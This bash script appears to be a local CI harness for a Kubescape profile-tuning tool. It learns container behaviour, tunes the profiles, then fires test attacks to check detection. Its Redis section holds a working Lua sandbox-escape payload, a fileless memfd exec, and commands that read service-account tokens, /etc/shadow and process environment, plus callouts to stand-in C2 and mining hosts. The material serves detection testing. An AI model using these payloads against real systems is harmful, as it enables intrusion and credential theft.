#!/usr/bin/env bash
# local-ci.sh — local mirror of .github/workflows/ci-bobctl-autotune.yaml
#
# Usage:
#   ./scripts/local-ci.sh                    # full run (setup + install + collapse + tune)
#   ./scripts/local-ci.sh --tune-only        # skip infra setup, re-run collapse + tune on existing profile
#   ./scripts/local-ci.sh --setup-only       # only set up infra (kubescape + alertmanager + webapp)
#   ./scripts/local-ci.sh --app redis        # tune redis instead of webapp (default: webapp)
#
# Differences from CI:
#   - learn timeout is 3m (kubescape values.yaml sets maxLearningPeriod: 2m)
#   - uses kubeconfig from env or ~/.kube/config
#   - uses K8s API service proxy (no port-forwarding needed)
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
cd "$REPO_ROOT"

# ── defaults ────────────────────────────────────────────────────────────────
TUNE_ONLY=false
SETUP_ONLY=false
APP=webapp
KS_NS=honey

while [[ $# -gt 0 ]]; do
  case "$1" in
    --tune-only)  TUNE_ONLY=true; shift ;;
    --setup-only) SETUP_ONLY=true; shift ;;
    --app)        APP="${2:-webapp}"; shift 2 ;;
    *)            shift ;;
  esac
done

log()  { echo "[$(date +%H:%M:%S)] $*"; }
die()  { log "ERROR: $*"; exit 1; }

# ── app-specific config ────────────────────────────────────────────────────
case "$APP" in
  webapp)
    APP_NS=webapp
    APP_FUNC_TESTS=example/webapp-functional-tests.yaml
    APP_ATTACKS=example/webapp-attacks.yaml
    APP_SERVICE=webapp-mywebapp
    APP_PORT=8080
    APP_SCORE_THRESHOLD=0
    ;;
  redis)
    APP_NS=redis
    APP_FUNC_TESTS=example/redis-functional-tests.yaml
    APP_ATTACKS=example/redis-attacks.yaml
    APP_SERVICE=redis
    APP_PORT=6379
    APP_SCORE_THRESHOLD=0
    ;;
  postgres)
    APP_NS=postgres
    APP_FUNC_TESTS=example/postgres-functional-tests.yaml
    APP_ATTACKS=example/postgres-attacks.yaml
    APP_SERVICE=pg-client
    APP_PORT=5432
    APP_SCHEME=tcp
    APP_PROFILE_MATCH="pg-client"
    APP_SCORE_THRESHOLD=0
    ;;
  postgres-vuln)
    APP_NS=postgres-vuln
    APP_FUNC_TESTS=example/postgres-vuln-functional-tests.yaml
    APP_ATTACKS=example/postgres-vuln-attacks.yaml
    APP_SERVICE=pg-vuln-client
    APP_PORT=5432
    APP_SCHEME=tcp
    APP_PROFILE_MATCH="replicaset-pg-vuln"
    APP_SCORE_THRESHOLD=0
    ;;
  mariadb)
    APP_NS=mariadb
    APP_FUNC_TESTS=example/mariadb-functional-tests.yaml
    APP_ATTACKS=example/mariadb-attacks.yaml
    # Target service must match what both suites declare (mariadb-client) —
    # otherwise local runs exercise a different exec-resolve path than CI
    # and can mask client-side regressions.
    APP_SERVICE=mariadb-client
    APP_PORT=3306
    APP_SCHEME=tcp
    # Pin the CLIENT profile. Every expectedDetection in the suite is
    # containerName: client, because exec attacks all land on the pod behind
    # target.service (mariadb-client) — there is no per-attack target override.
    # A bare "replicaset-mariadb" substring-matches the server profile AND
    # replicaset-mariadb-client-<hash>, so which one got tuned depended on API
    # listing order.
    APP_PROFILE_MATCH="replicaset-mariadb-client"
    APP_SCORE_THRESHOLD=0
    ;;
  flux-*)
    # All six Flux controller legs share one deployment and one namespace; only
    # the target service, the suites and the profile match differ.
    FLUX_COMPONENT="${APP#flux-}"
    APP_NS=flux-system
    APP_DEPLOY_TARGET=flux
    APP_FUNC_TESTS="example/flux-${FLUX_COMPONENT}-functional-tests.yaml"
    APP_ATTACKS="example/flux-${FLUX_COMPONENT}-attacks.yaml"
    APP_SERVICE="$FLUX_COMPONENT"
    APP_PROFILE_MATCH="${FLUX_COMPONENT}-.*-manager"
    APP_SCORE_THRESHOLD=0
    case "$FLUX_COMPONENT" in
      source-controller|notification-controller) APP_PORT=80 ;;
      *)                                         APP_PORT=8080 ;;
    esac
    # Upstream fluxcd/flux-benchmark drives the reconcile load. Registry and
    # artifact pushes happen before the pods exist so they cost none of the
    # learning window; --load then runs only the four benchmark phases.
    # The four benchmark phases take ~2.5m and `make deploy-flux` consumes the
    # first ~40s of the window waiting on six rollouts, so the default 2m window
    # would capture only the first phase. Widened here, at setup time, so the
    # node-agent config change lands before any Flux container starts.
    export KS_LEARN_PERIOD="${KS_LEARN_PERIOD:-8m}"
    # `make deploy-flux` is an idempotent apply, so on a re-run the controllers
    # keep their old pods and their learning windows are long closed. Restarting
    # the APP (never node-agent) gives each controller a new ReplicaSet identity,
    # which is what a fresh ContainerProfile is keyed on.
    APP_ROLLOUT_RESTART="source-controller kustomize-controller helm-controller notification-controller image-reflector-controller image-automation-controller"
    APP_LOAD_PREPARE="example/flux/benchmark/run-flux-benchmark.sh --prepare"
    APP_LOAD_DRIVER="KS=${FLUX_BENCH_KS:-10} HR=${FLUX_BENCH_HR:-5} TIMEOUT=6m example/flux/benchmark/run-flux-benchmark.sh --load"
    ;;
  *)
    die "Unknown app: $APP (use webapp, redis, postgres, postgres-vuln, mariadb, or flux-<controller>)"
    ;;
esac

# Allow override for arm64-only drift or exploratory runs without burying the
# real threshold: SCORE_THRESHOLD=99 ./scripts/local-ci.sh --app redis
APP_SCORE_THRESHOLD="${SCORE_THRESHOLD:-$APP_SCORE_THRESHOLD}"

APP_SCHEME="${APP_SCHEME:-http}"

# ── build ────────────────────────────────────────────────────────────────────
log "=== Build bobctl ==="
cd pkg
go build -o ../bin/bobctl ./main.go
cd ..
log "Build OK: bin/bobctl"

if $SETUP_ONLY || ! $TUNE_ONLY; then
  # ── install kubescape ──────────────────────────────────────────────────────
  log "=== Install kubescape (namespace: $KS_NS) ==="
  make kubescape
  # ── install alertmanager ───────────────────────────────────────────────────
  log "=== Install alertmanager ==="
  make alertmanager

  # ── wait for kubescape components ──────────────────────────────────────────
  log "=== Wait for kubescape components ==="
  kubectl wait --for=condition=ready pod -l app=node-agent   -n "$KS_NS" --timeout=180s
  kubectl wait --for=condition=ready pod -l app=storage      -n "$KS_NS" --timeout=180s
  kubectl wait --for=condition=ready pod -l app=alertmanager -n "$KS_NS" --timeout=120s
  log "All kubescape components ready"

  if $SETUP_ONLY; then
    log "=== Setup complete (--setup-only). Deploy app and run --tune-only next. ==="
    exit 0
  fi
fi

# ── deploy and learn app ─────────────────────────────────────────────────────
if ! $TUNE_ONLY; then
  APP_DEPLOY_TARGET="${APP_DEPLOY_TARGET:-$APP}"

  # Snapshot the profiles that already exist. If node-agent fails to observe the
  # new containers starting (the usual cause is an unset KS_RUNC on k3s, so
  # fanotify marks the wrong runc), no new profile is written and the poll below
  # would otherwise fall back to a stale profile from an earlier run and report a
  # score that has nothing to do with this learn.
  PRE_PROFILES=$(kubectl get containerprofiles -n "$APP_NS" \
    -o jsonpath='{range .items[*]}{.metadata.name}{"\n"}{end}' 2>/dev/null || true)
  log "Profiles present before learning: $(echo "$PRE_PROFILES" | grep -c . || true)"
  if [[ -n "${APP_LOAD_PREPARE:-}" ]]; then
    log "=== Prepare load driver (outside the learning window) ==="
    bash -c "$APP_LOAD_PREPARE" 2>&1 | tail -5
  fi

  # A pod left Failed/Evicted by an earlier run is not restarted by kubectl
  # apply, so the deploy target's readiness wait times out on a corpse.
  kubectl delete pod -n "$APP_NS" --field-selector status.phase=Failed --ignore-not-found >/dev/null 2>&1 || true
  kubectl delete pod -n "$APP_NS" --field-selector status.phase=Succeeded --ignore-not-found >/dev/null 2>&1 || true

  log "=== Deploy $APP via: make deploy-$APP_DEPLOY_TARGET ==="
  make deploy-"$APP_DEPLOY_TARGET"
  if [[ -n "${APP_ROLLOUT_RESTART:-}" ]]; then
    log "=== Restart app workloads for a fresh learning window ==="
    for d in $APP_ROLLOUT_RESTART; do
      kubectl -n "$APP_NS" rollout restart "deploy/$d" >/dev/null 2>&1 || true
    done
    for d in $APP_ROLLOUT_RESTART; do
      kubectl -n "$APP_NS" rollout status "deploy/$d" --timeout=300s || true
    done
  fi

  log "Deploy complete. Pods in $APP_NS:"
  kubectl get pods -n "$APP_NS" || true

  # node-agent is NEVER restarted. It is installed and waited on ABOVE, before
  # the app is deployed, so every app container starts while node-agent is
  # already watching and is picked up by live eBPF container-start events. A
  # restart here would be both redundant and destructive: it discards the
  # learning window and re-binds user-supplied profiles.
  # If a ContainerProfile ever comes up empty, the fix is to redeploy the APP
  # (kubectl rollout restart deploy/<app>), never to bounce node-agent.
  log "=== Confirm node-agent is watching before learning $APP ==="
  kubectl -n "$KS_NS" rollout status ds/node-agent --timeout=180s
  kubectl wait --for=condition=ready pod -l app=node-agent -n "$KS_NS" --timeout=180s

  # node-agent hooks a container at that container's START, and a workload
  # carrying kubescape.io/user-defined-profile is ENFORCED rather than learned.
  # A re-run inherits both: pods predating the current node-agent, and a bind
  # label left by an earlier demo. Drop the label and recreate the pods (never
  # node-agent) so the learn records something.
  for k in deployment statefulset daemonset; do
    for n in $(kubectl -n "$APP_NS" get "$k" -o name 2>/dev/null); do
      kubectl -n "$APP_NS" patch "$n" --type merge \
        -p '{"spec":{"template":{"metadata":{"labels":{"kubescape.io/user-defined-profile":null}}}}}' >/dev/null 2>&1 || true
    done
  done
  log "Recreating $APP_NS pods so they start under the current node-agent..."
  kubectl delete pods --all -n "$APP_NS" --wait=true --timeout=180s || true
  make deploy-"${APP_DEPLOY_TARGET:-$APP}" >/dev/null 2>&1 || true
  kubectl wait --for=condition=ready pod --all -n "$APP_NS" --timeout=300s || true

  # ── learn: exercise app + poll for completed profile ────────────────────────
  log "=== Learn $APP ==="
  MATCH="${APP_PROFILE_MATCH:-$APP}"

  # A ContainerProfile is keyed on the ReplicaSet that owns the container, so the
  # only profile describing what we just ran is the one named after the CURRENT
  # ReplicaSet. Pin to it. Snapshot-diffing alone is not enough: a profile from a
  # previous restart can be written after the snapshot is taken and then looks new.
  if [[ -n "${APP_SERVICE:-}" ]]; then
    CURRENT_RS=$(kubectl get pods -n "$APP_NS" \
      -l "app=$APP_SERVICE" -o jsonpath='{.items[0].metadata.ownerReferences[0].name}' 2>/dev/null || true)
    if [[ -n "$CURRENT_RS" ]]; then
      MATCH="replicaset-${CURRENT_RS}-"
      log "Pinning profile match to current ReplicaSet: $MATCH"
    else
      log "WARNING: could not resolve current ReplicaSet for $APP_SERVICE; falling back to '$MATCH'"
    fi
  fi

  # Run functional tests to exercise the app while node-agent learns.
  # --timeout must comfortably exceed the time it takes to run all functional
  # tests serially. The postgres suite is ~76 tests at ~500ms each = ~40s,
  # so 30s was too small and the tail tests systematically aborted with
  # "client rate limiter Wait returned an error: context deadline exceeded"
  # (the bobctl ctx, not a real throttle — the request was waiting in the
  # rate limiter when ctx expired). 180s leaves ample headroom.
  # Start the app's own load driver alongside the functional tests. For Flux
  # this is upstream's benchmark; the functional tests alone only exercise the
  # HTTP surface, not the reconcile path that dominates a controller's syscalls.
  LOAD_PID=""
  if [[ -n "${APP_LOAD_DRIVER:-}" ]]; then
    log "Starting load driver: $APP_LOAD_DRIVER"
    bash -c "$APP_LOAD_DRIVER" > "/tmp/load-driver-$APP.log" 2>&1 &
    LOAD_PID=$!
    trap '[[ -n "$LOAD_PID" ]] && kill "$LOAD_PID" 2>/dev/null || true' EXIT
  fi

  log "Running functional tests during learning period..."
  for i in $(seq 1 8); do
    bin/bobctl learn \
      --functional-tests "$APP_FUNC_TESTS" \
      -n "$APP_NS" --timeout 180s --interval 15s -v 2>&1 | tail -5 || true
    sleep 5
  done

  if [[ -n "$LOAD_PID" ]]; then
    log "Waiting for load driver to finish..."
    wait "$LOAD_PID" 2>/dev/null || true
    LOAD_PID=""
    trap - EXIT
    tail -5 "/tmp/load-driver-$APP.log" 2>/dev/null | sed 's/^/    /' || true
  fi

  # Poll for completed, non-user-generated profile
  log "Waiting for completed profile (match: '$MATCH')..."
  TIMEOUT=600
  ELAPSED=0
  PROFILE=""
  while [ $ELAPSED -lt $TIMEOUT ]; do
    ALL_COMPLETED=$(kubectl get containerprofiles -n "$APP_NS" \
      -o jsonpath='{range .items[?(@.metadata.annotations.kubescape\.io/status=="completed")]}{.metadata.name}{"\n"}{end}' \
      2>/dev/null | grep -v "^ug-" | grep -v "^job-" || true)
    # Only profiles that did not exist before this learn count. Without this a
    # failed learn silently reuses an earlier run's profile and reports its score.
    if [[ -n "$PRE_PROFILES" ]]; then
      ALL_COMPLETED=$(comm -13 <(echo "$PRE_PROFILES" | sort -u) <(echo "$ALL_COMPLETED" | sort -u) || true)
    fi
    PROFILE=$(echo "$ALL_COMPLETED" | grep -i "$MATCH" | grep -v "client" | head -1)
    [[ -z "$PROFILE" ]] && PROFILE=$(echo "$ALL_COMPLETED" | grep -i "$MATCH" | head -1)
    [[ -z "$PROFILE" ]] && PROFILE=$(echo "$ALL_COMPLETED" | head -1)
    if [[ -n "$PROFILE" ]]; then
      log "Profile completed: $PROFILE"
      log "All completed profiles in $APP_NS:"
      echo "$ALL_COMPLETED" | while read -r p; do [[ -n "$p" ]] && log "  - $p"; done
      break
    fi
    log "  No completed profile yet ($ELAPSED/${TIMEOUT}s)..."
    sleep 15
    ELAPSED=$((ELAPSED + 15))
  done
  [[ -n "$PROFILE" ]] || die "No completed profile found after ${TIMEOUT}s"

  log "Learned profile: $PROFILE"
  echo "$PROFILE" > /tmp/bobctl-last-profile-$APP

  # Keep the profile EXACTLY as learned, before the tuner touches it. This is the
  # only copy of the real observed behaviour; everything downstream is derived and
  # can be regenerated from it, but a collapsed path can never be recovered.
  mkdir -p results
  RAW_PROFILE="results/learned-profile-raw-$APP.yaml"
  kubectl get containerprofiles -n "$APP_NS" "$PROFILE" -o yaml > "$RAW_PROFILE" 2>/dev/null || true
  if [[ -s "$RAW_PROFILE" ]]; then
    log "Kept raw learned profile: $RAW_PROFILE ($(grep -c 'path:' "$RAW_PROFILE" || echo 0) paths)"
    # A leading wildcard here means node-agent collapsed during LEARNING, so the
    # raw profile is already destroyed and there is nothing to substitute back.
    # Raise the collapse thresholds rather than tuning around it.
    if ! python3 "$SCRIPT_DIR/check-no-overbroad.py" "$RAW_PROFILE"; then
      die "the LEARNED profile already contains a leading-wildcard open — collapse happened during learning. Raise openDynamicThreshold in the applied CollapseConfiguration; do not proceed."
    fi
  fi
else
  # Re-use last learned profile
  if [[ -f /tmp/bobctl-last-profile-$APP ]]; then
    PROFILE=$(cat /tmp/bobctl-last-profile-$APP)
    log "Re-using saved profile: $PROFILE"
  else
    # Discover from cluster — prefer profile whose name contains the app/service name
    log "Discovering completed profiles in $APP_NS..."
    ALL_LEARNED=$(kubectl get containerprofiles -n "$APP_NS" \
      -o jsonpath='{range .items[?(@.metadata.annotations.kubescape\.io/status=="completed")]}{.metadata.name}{"\n"}{end}' \
      2>/dev/null | grep -v "^ug-" | grep -v "^job-" || true)
    MATCH="${APP_PROFILE_MATCH:-$APP}"
    PROFILE=$(echo "$ALL_LEARNED" | grep -i "$MATCH" | grep -v "client" | head -1)
    [[ -z "$PROFILE" ]] && PROFILE=$(echo "$ALL_LEARNED" | grep -i "$MATCH" | head -1)
    [[ -z "$PROFILE" ]] && PROFILE=$(echo "$ALL_LEARNED" | grep -i "$APP" | head -1)
    [[ -z "$PROFILE" ]] && PROFILE=$(echo "$ALL_LEARNED" | head -1)
    [[ -n "$PROFILE" ]] || die "No completed learned profile found in $APP_NS. Run without --tune-only first."
    log "Discovered profile: $PROFILE"
  fi
fi

# ── clean results (prevent cross-app contamination) ─────────────────────────
rm -rf results
mkdir -p results

# ── run collapse analysis ────────────────────────────────────────────────────
log "=== Run collapse analysis ==="
set +e
bin/bobctl collapse \
  --namespaces "$APP_NS" \
  --noisy-threshold 10 \
  --apply \
  -v 2>&1 | tee results/collapse-analysis.txt
COLLAPSE_EXIT=${PIPESTATUS[0]}
set -e
if [[ "$COLLAPSE_EXIT" -eq 0 ]]; then
  log "Collapse analysis: OK"
else
  log "Collapse analysis: finished with exit $COLLAPSE_EXIT (continuing)"
fi

# ── run tune ─────────────────────────────────────────────────────────────────
log "=== Run tune ==="
set +e
SCHEME_FLAG=""
if [[ "$APP_SCHEME" == "https" ]]; then
  SCHEME_FLAG="--service-scheme https"
fi
bin/bobctl tune \
  --profile "$PROFILE" \
  -n "$APP_NS" \
  --ks-namespace "$KS_NS" \
  --service "$APP_SERVICE" \
  --service-port "$APP_PORT" \
  --alertmanager-service alertmanager \
  --alertmanager-port 9093 \
  --functional-tests "$APP_FUNC_TESTS" \
  --attack-suite "$APP_ATTACKS" \
  --output-dir results \
  --max-rounds 3 \
  --debug \
  $SCHEME_FLAG \
  -v 2>&1 | tee /tmp/tune-output.txt
TUNE_EXIT=${PIPESTATUS[0]}
set -e

# ── render tune metrics GIF ──────────────────────────────────────────────────
if [[ -f results/metrics.json ]]; then
  log "=== Render tune metrics GIF ==="
  "$SCRIPT_DIR/render-gif.sh" results/metrics.json results/tune.gif --title "$APP (local)" || \
    log "WARNING: GIF rendering failed (non-fatal)"
fi

# ── network portability assertion (N4: cluster-internal egress dropped) ───────
# The tuner DROPS installation-specific cluster-internal egress IPs (no alerting
# rule reads them — R0005 uses the DNS name and exempts .svc.cluster.local,
# R0011 is public-only); cluster-internal egress is matched by DNS name instead.
# Assert: NO private literal (RFC1918) survives anywhere in the shipped profile's
# IP fields — singular ipAddress or an ipAddresses[] list entry.
#
# CP migration: the network shape (ingress/egress) is now INLINE on the
# ContainerProfile, so the assertion runs against best-profile.yaml's egress
# instead of the retired best-nn.yaml.
# The tuner emits the profile as learned, so cluster-specific literals survive
# into it: the apiserver ClusterIP, this pod's own IP in an inbound Host header,
# today's A record for an external peer. Rewrite them to their portable forms
# before the gate below asserts none are left.
# The tuner may over-collapse. Put the originally-learned opens back before the
# profile is normalised or shipped — the raw learn is ground truth, the collapsed
# form is a lossy summary of it.
RAW_PROFILE="results/learned-profile-raw-$APP.yaml"
if [[ -f results/best-profile.yaml && -s "$RAW_PROFILE" ]]; then
  log "=== Restore over-collapsed opens from the raw learn ==="
  python3 "$SCRIPT_DIR/restore-overcollapsed.py" --raw "$RAW_PROFILE" \
    --tuned results/best-profile.yaml 2>&1 | sed 's/^/    /' || \
    die "restore-overcollapsed.py failed"
fi

# Nothing with a leading-wildcard open ships, whatever the tuner reported.
if [[ -f results/best-profile.yaml ]]; then
  python3 "$SCRIPT_DIR/check-no-overbroad.py" results/best-profile.yaml || \
    die "best-profile.yaml still has a leading-wildcard open after restore"
fi

if [[ -f results/best-profile.yaml ]]; then
  log "=== Normalise cluster-specific values (portable-sbob.py) ==="
  python3 "$SCRIPT_DIR/portable-sbob.py" results/best-profile.yaml 2>&1 | sed 's/^/    /' || \
    die "portable-sbob.py failed on results/best-profile.yaml"
fi

if [[ -f results/best-profile.yaml ]]; then
  log "=== Network portability check (best-profile.yaml egress) ==="
  if grep -nE '(ipAddress: *"?|^[[:space:]]*-[[:space:]]+)(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.)' results/best-profile.yaml; then
    die "best-profile.yaml leaked a cluster-internal/private IP — N4 should DROP it (DNS name is the portable discriminant)"
  fi
  log "  OK: no cluster-internal/private IP literals in best-profile.yaml (all dropped; egress is DNS-discriminated)"
fi

# ── redis post-tune: direct attack verification ─────────────────────────────
if [[ "$APP" == "redis" ]]; then
  log "=== Redis post-tune attack verification (12 attacks) ==="
  REDIS_POD=$(kubectl -n redis get pod -l app.kubernetes.io/name=redis \
    -o jsonpath='{.items[0].metadata.name}')

  LUA_ESCAPE='local io_mod=nil;pcall(function() if type(io)=="table" and io.popen then io_mod=io end end);if not io_mod then pcall(function() local l=package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0","luaopen_io");if l then io_mod=l() end end) end;if not io_mod then return "sandbox_blocked" end;'

  run_eval() {
    local name="$1" script="$2"
    echo -n "  [$name] "
    result=$(kubectl -n redis exec "$REDIS_POD" -- redis-cli EVAL "$script" 0 2>&1) || true
    echo "$(echo $result | head -c 80)"
  }

  # 1: Fileless memfd_create + execve (R1005)
  log "Attack 1: Fileless memfd (R1005)"
  kubectl -n redis exec "$REDIS_POD" -- perl -e '
    my $name = "pwned\0";
    my $fd = syscall(319, $name, 0);
    die "memfd_create failed" if $fd < 0;
    open(my $src, "<:raw", "/bin/echo") or die "open: $!";
    open(my $dst, ">&=", $fd) or die "dup: $!";
    binmode $dst; my $buf;
    while (my $n = read($src, $buf, 8192)) { print $dst $buf; }
    close($src);
    exec("/proc/self/fd/$fd", "echo", "FILELESS-EXEC-DETECTED");
  ' 2>&1 || echo "  memfd exec completed"

  # 2-12: EVAL-based attacks via Lua sandbox escape
  run_eval "SA-token-R0006" "${LUA_ESCAPE} local f=io_mod.popen('cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo no_token');local o=f:read('*a');f:close();return o"
  run_eval "shadow-R0010" "${LUA_ESCAPE} local f=io_mod.popen('cat /etc/shadow 2>&1; echo shadow_attempted');local o=f:read('*a');f:close();return o"
  run_eval "whoami-R0001" "${LUA_ESCAPE} local f=io_mod.popen('whoami');local o=f:read('*a');f:close();return 'user:' .. o"
  run_eval "dns-R0005" "${LUA_ESCAPE} local f=io_mod.popen('getent hosts evil.attacker.example.com 2>&1 || echo dns_done');local o=f:read('*a');f:close();return 'dns:' .. o"
  run_eval "drifted-R1001" "${LUA_ESCAPE} local f=io_mod.popen('cp /bin/ls /tmp/drifted_redis && /tmp/drifted_redis /etc 2>&1; rm -f /tmp/drifted_redis');local o=f:read('*a');f:close();return 'drifted:' .. o"
  run_eval "devshm-R1000" "${LUA_ESCAPE} local f=io_mod.popen('cp /bin/echo /dev/shm/malicious && /dev/shm/malicious pwned 2>&1; rm -f /dev/shm/malicious');local o=f:read('*a');f:close();return 'shm:' .. o"
  run_eval "environ-R0008" "${LUA_ESCAPE} local f=io_mod.popen('cat /proc/1/environ 2>/dev/null | tr \"\\\\0\" \"\\\\n\" | head -1 || echo no_environ');local o=f:read('*a');f:close();return 'environ:' .. o"
  run_eval "symlink-R1010" "${LUA_ESCAPE} local f=io_mod.popen('ln -sf /etc/shadow /tmp/shadow_link 2>&1; rm -f /tmp/shadow_link; echo symlink_done');local o=f:read('*a');f:close();return 'symlink:' .. o"
  run_eval "mining-R1008" "${LUA_ESCAPE} local f=io_mod.popen('getent hosts xmr.pool.minergate.com 2>&1 || echo mining_dns_done');local o=f:read('*a');f:close();return 'mining:' .. o"
  run_eval "perl-c2-R0001" "${LUA_ESCAPE}"' local f=io_mod.popen("perl -e '"'"'use IO::Socket::INET;my $s=IO::Socket::INET->new(PeerAddr=>\"c2.evil.example.com\",PeerPort=>80,Timeout=>2);print defined $s ? \"ok\" : \"fail\";'"'"' 2>&1; echo done");local o=f:read("*a");f:close();return "c2:" .. o'
  run_eval "creds-R0001" "${LUA_ESCAPE}"' local f=io_mod.popen("awk -F: '"'"'$3==0{print $1}'"'"' /etc/passwd && id 2>&1");local o=f:read("*a");f:close();return "creds:" .. o'

  log "All 12 Redis attacks executed. Waiting for alert propagation..."
  sleep 15

  # ── Cross-pod endpoint test ────────────────────────────────────────────────
  # Attacks from redis-client pod → Redis service over the network.
  # This tests endpoint detection: node-agent sees real pod-to-pod traffic.
  log "=== Cross-pod endpoint test ==="
  kubectl -n redis wait --for=condition=ready pod -l app.kubernetes.io/name=redis-client --timeout=60s 2>/dev/null || true
  CLIENT_POD=$(kubectl -n redis get pod -l app.kubernetes.io/name=redis-client \
    -o jsonpath='{.items[0].metadata.name}' 2>/dev/null) || true

  if [[ -n "$CLIENT_POD" ]]; then
    log "Client pod: $CLIENT_POD"

    # Benign: PING via standard port (should be in profile)
    log "  Cross-pod benign: PING via redis:6379"
    kubectl -n redis exec "$CLIENT_POD" -- redis-cli -h redis -p 6379 PING 2>&1 || true

    # Benign: SET/GET via standard port
    log "  Cross-pod benign: SET/GET via redis:6379"
    kubectl -n redis exec "$CLIENT_POD" -- redis-cli -h redis -p 6379 SET crosstest hello 2>&1 || true
    kubectl -n redis exec "$CLIENT_POD" -- redis-cli -h redis -p 6379 GET crosstest 2>&1 || true

    # Alt-port: PING via non-standard port 16379 (redis-alt-port service)
    # If profile has port=6379, this should be an endpoint anomaly.
    # If profile has port=0 (wildcard), this is silently allowed — proving the risk.
    log "  Cross-pod alt-port: PING via redis-alt-port:16379"
    kubectl -n redis exec "$CLIENT_POD" -- redis-cli -h redis-alt-port -p 16379 PING 2>&1 || true

    # Attack: Lua sandbox escape from cross-pod client
    log "  Cross-pod attack: Lua exploit via redis:6379"
    kubectl -n redis exec "$CLIENT_POD" -- redis-cli -h redis -p 6379 \
      EVAL "${LUA_ESCAPE} local f=io_mod.popen('whoami');local o=f:read('*a');f:close();return 'crosspod:' .. o" 0 2>&1 || true

    # Attack: Same exploit via alt-port
    log "  Cross-pod attack: Lua exploit via redis-alt-port:16379"
    kubectl -n redis exec "$CLIENT_POD" -- redis-cli -h redis-alt-port -p 16379 \
      EVAL "${LUA_ESCAPE} local f=io_mod.popen('id');local o=f:read('*a');f:close();return 'altport:' .. o" 0 2>&1 || true

    # Dump the learned profile's endpoints for verification
    log "  Profile endpoints:"
    kubectl get containerprofile -n redis -o jsonpath='{range .items[*]}{.metadata.name}{": "}{.spec.endpoints}{"\n"}{end}' 2>/dev/null || echo "  (no profiles found)"

    sleep 10
  else
    log "WARNING: redis-client pod not found, skipping cross-pod tests"
  fi
fi

# ── export best profile ──────────────────────────────────────────────────────
log "=== Export best profile ==="
if [[ -f results/metrics.json ]]; then
  BEST_ITER=$(python3 -c "
import json
with open('results/metrics.json') as f:
    records = json.load(f)
tested = [r for r in records if r['phase'] != 'raw-baseline']
if tested:
    # Tie-break on profile size when score is equal: a Phase-B-minimised
    # iteration with the same zero score is strictly preferable to the
    # uncompacted baseline (both pass detection, smaller profile is the
    # tuner's actual best). Without this, score=0 ties always picked the
    # first iteration (the baseline) and shipped a profile with 3-5x the
    # exec entries. Mirrors the tuner's isStrictlyBetter ordering at
    # pkg/autotune/best_recovery.go:65. The total-entries field is a
    # flat key on each metrics.json record (NOT nested under 'metrics').
    best = min(tested, key=lambda r: (r['score'], r.get('total_entries', 0)))
    print(best['iteration'])
" 2>/dev/null || echo "")
  BEST_FILE="results/${PROFILE}-iteration${BEST_ITER}.yaml"
  if [[ -n "$BEST_ITER" ]] && [[ -f "$BEST_FILE" ]]; then
    log "Best iteration: $BEST_ITER"
    # Produce a clean, kubectl-applyable ContainerProfile.
    # See scripts/clean-profile.py for the full filter logic.
    if python3 "$SCRIPT_DIR/clean-profile.py" "$BEST_FILE" results/best-profile.yaml 2>/dev/null; then
      log "Best profile: results/best-profile.yaml"
    else
      log "WARNING: clean-profile.py failed, falling back to grep"
      grep -v '^\s*kubescape\.io/' "$BEST_FILE" \
        | grep -v '^\s*spdx\.softwarecomposition\.kubescape\.io/' \
        > results/best-profile.yaml \
        || cp "$BEST_FILE" results/best-profile.yaml
    fi
  else
    log "WARNING: Could not find best iteration file: $BEST_FILE"
  fi
fi

# ── run attacks (separate pass for detection report) ─────────────────────────
log "=== Run attacks ==="
set +e
bin/bobctl attack \
  --attack-suite "$APP_ATTACKS" \
  -n "$APP_NS" \
  --service "$APP_SERVICE" \
  --service-port "$APP_PORT" \
  --format markdown 2>&1 | tee results/attack-results.md
set -e

# ── guard against false-green (HTTP/HTTPS service unreachable) ──────────────
# Mirrors the same-named CI step: fails early if every attack returned code 0
# (network error / no endpoints), which otherwise lets a broken target pass
# both the attack step and the downstream score gate.
if [[ "$APP_SCHEME" == "http" || "$APP_SCHEME" == "https" ]]; then
  if [[ ! -f results/attack-results.md ]]; then
    log "FAIL: attack-results.md missing — bobctl attack did not run"
    exit 1
  fi
  NONZERO=$(awk -F'|' '/^\| *[a-z]/ && !/---/ && !/^\| Type \|/ {gsub(/ /,"",$4); if ($4 != "0" && $4 != "") n++} END {print n+0}' results/attack-results.md)
  TOTAL=$(awk -F'|' '/^\| *[a-z]/ && !/---/ && !/^\| Type \|/ {n++} END {print n+0}' results/attack-results.md)
  log "Attacks: $NONZERO of $TOTAL returned a non-zero HTTP code"
  if [[ "$NONZERO" == "0" && "$TOTAL" -gt 0 ]]; then
    log "FAIL: every attack returned code 0 — target service was unreachable (false-green)"
    cat results/attack-results.md
    exit 1
  fi
fi

# ── detection report ─────────────────────────────────────────────────────────
log "=== Detection report ==="
set +e
bin/bobctl report \
  --alertmanager-service alertmanager \
  --alertmanager-port 9093 \
  --ks-namespace "$KS_NS" \
  -n "$APP_NS" \
  --format markdown 2>&1 | tee results/detection-report.md
set -e

# ── collect diagnostics ──────────────────────────────────────────────────────
log "=== Diagnostics ==="
echo "--- Node-agent logs (last 100) ---"
kubectl logs -n "$KS_NS" -l app=node-agent --tail=100 2>/dev/null || echo "(no node-agent logs)"
echo "--- Storage logs (last 50) ---"
kubectl logs -n "$KS_NS" -l app=storage --tail=50 2>/dev/null || echo "(no storage logs)"
echo "--- Alertmanager alerts ---"
kubectl get --raw \
  "/api/v1/namespaces/$KS_NS/services/alertmanager:9093/proxy/api/v2/alerts?active=true" \
  2>/dev/null | python3 -c "
import json,sys
for a in json.load(sys.stdin):
  l=a.get('labels',{})
  print(f\"  rule={l.get('rule_name','?')} comm={l.get('comm','?')} ns={l.get('namespace','?')}\")
" 2>/dev/null || echo "  (no alerts or alertmanager unreachable)"

# ── validate artifact isolation ───────────────────────────────────────────────
log "=== Artifact isolation check ==="
FOREIGN_FILES=""
ISOLATION_MATCH="${APP_PROFILE_MATCH:-$APP}"
for f in results/*-iteration*.yaml; do
  [[ -f "$f" ]] || continue
  if ! echo "$f" | grep -qi "$ISOLATION_MATCH"; then
    FOREIGN_FILES="$FOREIGN_FILES $f"
  fi
done
if [[ -n "$FOREIGN_FILES" ]]; then
  log "FAIL: Found files from other apps in results/:"
